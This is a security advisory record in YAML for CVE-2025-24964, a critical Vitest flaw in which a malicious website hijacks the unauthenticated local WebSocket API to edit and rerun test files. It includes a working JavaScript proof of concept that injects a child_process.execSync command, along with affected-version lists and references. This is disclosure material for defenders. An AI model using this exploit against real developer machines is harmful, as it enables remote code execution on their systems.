@@ -1,0 +1,319 @@
+advisory_id: GHSA-9crc-q9x8-hgqq
+datasource_id: github_osv/GHSA-9crc-q9x8-hgqq
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-9crc-q9x8-hgqq/GHSA-9crc-q9x8-hgqq.json
+aliases:
+  - CVE-2025-24964
+summary: |
+  Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening
+  ### Summary
+  Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.
+
+  ### Details
+  When [`api` option](https://vitest.dev/config/#api) is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
+  https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46
+
+  This WebSocket server has `saveTestFile` API that can edit a test file and `rerun` API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the `saveTestFile` API and then running that file by calling the `rerun` API.
+  https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76
+
+  ### PoC
+  1. Open Vitest UI.
+  2. Access a malicious web site with the script below.
+  3. If you have `calc` executable in `PATH` env var (you'll likely have it if you are running on Windows), that application will be executed.
+
+  ```js
+  // code from https://github.com/WebReflection/flatted
+  const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p<y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&&(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g<m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&&u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&&t(r)===c?function(n,t){return""===n||-1<r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y<l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});
+
+  // actual code to run
+  const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
+  ws.addEventListener('message', e => {
+      console.log(e.data)
+  })
+  ws.addEventListener('open', () => {
+      ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))
+
+      const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"
+
+      // edit file content to inject command execution
+      ws.send(Flatted.stringify({
+        t: 'q',
+        i: crypto.randomUUID(),
+        m: "saveTestFile",
+        a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
+      }))
+      // rerun the tests to run the injected command execution code
+      ws.send(Flatted.stringify({
+        t: 'q',
+        i: crypto.randomUUID(),
+        m: "rerun",
+        a: [testFilePath]
+      }))
+  })
+  ```
+
+  ### Impact
+  This vulnerability can result in remote code execution for users that are using Vitest serve API.
+impacted_packages:
+  - purl: pkg:npm/vitest
+    affected_versions: vers:npm/>=2.0.0|<2.1.9
+    fixed_versions: vers:npm/2.1.9
+    affected_packages:
+      - pkg:npm/vitest@2.0.0
+      - pkg:npm/vitest@2.0.1
+      - pkg:npm/vitest@2.0.2
+      - pkg:npm/vitest@2.0.3
+      - pkg:npm/vitest@2.0.4
+      - pkg:npm/vitest@2.0.5
+      - pkg:npm/vitest@2.1.0-beta.1
+      - pkg:npm/vitest@2.1.0-beta.2
+      - pkg:npm/vitest@2.1.0-beta.3
+      - pkg:npm/vitest@2.1.0-beta.4
+      - pkg:npm/vitest@2.1.0-beta.5
+      - pkg:npm/vitest@2.1.0-beta.6
+      - pkg:npm/vitest@2.1.0-beta.7
+      - pkg:npm/vitest@2.1.0
+      - pkg:npm/vitest@2.1.1
+      - pkg:npm/vitest@2.1.2
+      - pkg:npm/vitest@2.1.3
+      - pkg:npm/vitest@2.1.4
+      - pkg:npm/vitest@2.1.5
+      - pkg:npm/vitest@2.1.6
+      - pkg:npm/vitest@2.1.7
+      - pkg:npm/vitest@2.1.8
+    fixed_packages:
+      - pkg:npm/vitest@2.1.9
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/vitest
+    affected_versions: vers:npm/>=3.0.0|<3.0.5
+    fixed_versions: vers:npm/3.0.5
+    affected_packages:
+      - pkg:npm/vitest@3.0.0
+      - pkg:npm/vitest@3.0.1
+      - pkg:npm/vitest@3.0.2
+      - pkg:npm/vitest@3.0.3
+      - pkg:npm/vitest@3.0.4
+    fixed_packages:
+      - pkg:npm/vitest@3.0.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/vitest
+    affected_versions: vers:npm/<=0.0.125
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/vitest@0.0.0
+      - pkg:npm/vitest@0.0.1
+      - pkg:npm/vitest@0.0.2
+      - pkg:npm/vitest@0.0.3
+      - pkg:npm/vitest@0.0.4
+      - pkg:npm/vitest@0.0.6
+      - pkg:npm/vitest@0.0.7
+      - pkg:npm/vitest@0.0.8
+      - pkg:npm/vitest@0.0.9
+      - pkg:npm/vitest@0.0.10
+      - pkg:npm/vitest@0.0.11
+      - pkg:npm/vitest@0.0.12
+      - pkg:npm/vitest@0.0.13
+      - pkg:npm/vitest@0.0.14
+      - pkg:npm/vitest@0.0.15
+      - pkg:npm/vitest@0.0.16
+      - pkg:npm/vitest@0.0.17
+      - pkg:npm/vitest@0.0.18
+      - pkg:npm/vitest@0.0.19
+      - pkg:npm/vitest@0.0.20
+      - pkg:npm/vitest@0.0.21
+      - pkg:npm/vitest@0.0.22
+      - pkg:npm/vitest@0.0.23
+      - pkg:npm/vitest@0.0.24
+      - pkg:npm/vitest@0.0.25
+      - pkg:npm/vitest@0.0.26
+      - pkg:npm/vitest@0.0.27
+      - pkg:npm/vitest@0.0.28
+      - pkg:npm/vitest@0.0.29
+      - pkg:npm/vitest@0.0.30
+      - pkg:npm/vitest@0.0.31
+      - pkg:npm/vitest@0.0.32
+      - pkg:npm/vitest@0.0.33
+      - pkg:npm/vitest@0.0.34
+      - pkg:npm/vitest@0.0.35
+      - pkg:npm/vitest@0.0.36
+      - pkg:npm/vitest@0.0.37
+      - pkg:npm/vitest@0.0.38
+      - pkg:npm/vitest@0.0.39
+      - pkg:npm/vitest@0.0.40
+      - pkg:npm/vitest@0.0.41
+      - pkg:npm/vitest@0.0.42
+      - pkg:npm/vitest@0.0.43
+      - pkg:npm/vitest@0.0.44
+      - pkg:npm/vitest@0.0.45
+      - pkg:npm/vitest@0.0.46
+      - pkg:npm/vitest@0.0.47
+      - pkg:npm/vitest@0.0.48
+      - pkg:npm/vitest@0.0.49
+      - pkg:npm/vitest@0.0.50
+      - pkg:npm/vitest@0.0.51
+      - pkg:npm/vitest@0.0.52
+      - pkg:npm/vitest@0.0.53
+      - pkg:npm/vitest@0.0.54
+      - pkg:npm/vitest@0.0.55
+      - pkg:npm/vitest@0.0.56
+      - pkg:npm/vitest@0.0.57
+      - pkg:npm/vitest@0.0.58
+      - pkg:npm/vitest@0.0.59
+      - pkg:npm/vitest@0.0.60
+      - pkg:npm/vitest@0.0.61
+      - pkg:npm/vitest@0.0.62
+      - pkg:npm/vitest@0.0.63
+      - pkg:npm/vitest@0.0.64
+      - pkg:npm/vitest@0.0.65
+      - pkg:npm/vitest@0.0.66
+      - pkg:npm/vitest@0.0.67
+      - pkg:npm/vitest@0.0.68
+      - pkg:npm/vitest@0.0.69
+      - pkg:npm/vitest@0.0.70
+      - pkg:npm/vitest@0.0.71
+      - pkg:npm/vitest@0.0.72
+      - pkg:npm/vitest@0.0.73
+      - pkg:npm/vitest@0.0.74
+      - pkg:npm/vitest@0.0.75
+      - pkg:npm/vitest@0.0.76
+      - pkg:npm/vitest@0.0.77
+      - pkg:npm/vitest@0.0.78
+      - pkg:npm/vitest@0.0.79
+      - pkg:npm/vitest@0.0.80
+      - pkg:npm/vitest@0.0.81
+      - pkg:npm/vitest@0.0.82
+      - pkg:npm/vitest@0.0.83
+      - pkg:npm/vitest@0.0.84
+      - pkg:npm/vitest@0.0.85
+      - pkg:npm/vitest@0.0.87
+      - pkg:npm/vitest@0.0.88
+      - pkg:npm/vitest@0.0.89
+      - pkg:npm/vitest@0.0.90
+      - pkg:npm/vitest@0.0.91
+      - pkg:npm/vitest@0.0.92
+      - pkg:npm/vitest@0.0.93
+      - pkg:npm/vitest@0.0.94
+      - pkg:npm/vitest@0.0.95
+      - pkg:npm/vitest@0.0.96
+      - pkg:npm/vitest@0.0.97
+      - pkg:npm/vitest@0.0.98
+      - pkg:npm/vitest@0.0.99
+      - pkg:npm/vitest@0.0.100
+      - pkg:npm/vitest@0.0.101
+      - pkg:npm/vitest@0.0.102
+      - pkg:npm/vitest@0.0.103
+      - pkg:npm/vitest@0.0.104
+      - pkg:npm/vitest@0.0.105
+      - pkg:npm/vitest@0.0.106
+      - pkg:npm/vitest@0.0.107
+      - pkg:npm/vitest@0.0.108
+      - pkg:npm/vitest@0.0.109
+      - pkg:npm/vitest@0.0.110
+      - pkg:npm/vitest@0.0.111
+      - pkg:npm/vitest@0.0.112
+      - pkg:npm/vitest@0.0.113
+      - pkg:npm/vitest@0.0.114
+      - pkg:npm/vitest@0.0.115
+      - pkg:npm/vitest@0.0.116
+      - pkg:npm/vitest@0.0.117
+      - pkg:npm/vitest@0.0.118
+      - pkg:npm/vitest@0.0.119
+      - pkg:npm/vitest@0.0.120
+      - pkg:npm/vitest@0.0.121
+      - pkg:npm/vitest@0.0.122
+      - pkg:npm/vitest@0.0.123
+      - pkg:npm/vitest@0.0.124
+      - pkg:npm/vitest@0.0.125
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/vitest-dev/vitest
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/vitest-dev/vitest
+        commit: 7ce9fbb4972d45c6fd34c843645ef6f549bbb241
+        patch_text:
+      - vcs_url: https://github.com/vitest-dev/vitest
+        commit: 9a581e1c43e5c02b11e2a8026a55ce6a8cb35114
+        patch_text:
+      - vcs_url: https://github.com/vitest-dev/vitest
+        commit: 191ef9e34c867d0efd04f49b3d38193a68e825dc
+        patch_text:
+      - vcs_url: https://github.com/vitest-dev/vitest
+        commit: e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/vitest
+    affected_versions: vers:npm/>=1.0.0|<1.6.1
+    fixed_versions: vers:npm/1.6.1
+    affected_packages:
+      - pkg:npm/vitest@1.0.0
+      - pkg:npm/vitest@1.0.1
+      - pkg:npm/vitest@1.0.2
+      - pkg:npm/vitest@1.0.3
+      - pkg:npm/vitest@1.0.4
+      - pkg:npm/vitest@1.1.0
+      - pkg:npm/vitest@1.1.1
+      - pkg:npm/vitest@1.1.2
+      - pkg:npm/vitest@1.1.3
+      - pkg:npm/vitest@1.2.0
+      - pkg:npm/vitest@1.2.1
+      - pkg:npm/vitest@1.2.2
+      - pkg:npm/vitest@1.3.0
+      - pkg:npm/vitest@1.3.1
+      - pkg:npm/vitest@1.4.0
+      - pkg:npm/vitest@1.5.0
+      - pkg:npm/vitest@1.5.1
+      - pkg:npm/vitest@1.5.2
+      - pkg:npm/vitest@1.5.3
+      - pkg:npm/vitest@1.6.0
+    fixed_packages:
+      - pkg:npm/vitest@1.6.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '9.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-9crc-q9x8-hgqq/GHSA-9crc-q9x8-hgqq.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-1385
+references:
+  - url: https://github.com/vitest-dev/vitest
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241
+    reference_type:
+    reference_id:
+  - url: https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383
+    reference_type:
+    reference_id:
+  - url: https://vitest.dev/config/#api
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-24964
+    reference_type:
+    reference_id: CVE-2025-24964
+  - url: https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq
+    reference_type:
+    reference_id: GHSA-9crc-q9x8-hgqq
+exploits: []
